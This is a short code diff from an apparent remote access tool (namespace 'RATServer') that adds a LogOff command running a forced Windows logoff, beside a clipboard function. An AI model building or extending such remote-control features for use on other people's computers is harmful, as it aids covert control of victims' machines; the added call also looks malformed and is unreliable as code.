@@ -97,6 +97,17 @@ namespace RATServer
             catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
+        public static Response LogOff()
+        {
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                Process.Start("cmd.exe shutdown -l -f");
+                r.Msg = "Log Off Success";
+            }
+            catch (Exception e) { r.Msg = e.Message; }
+            return r;
+        }
         public static Response ClipBoard()
         {
             Response r = new Response { Type = "Message" };
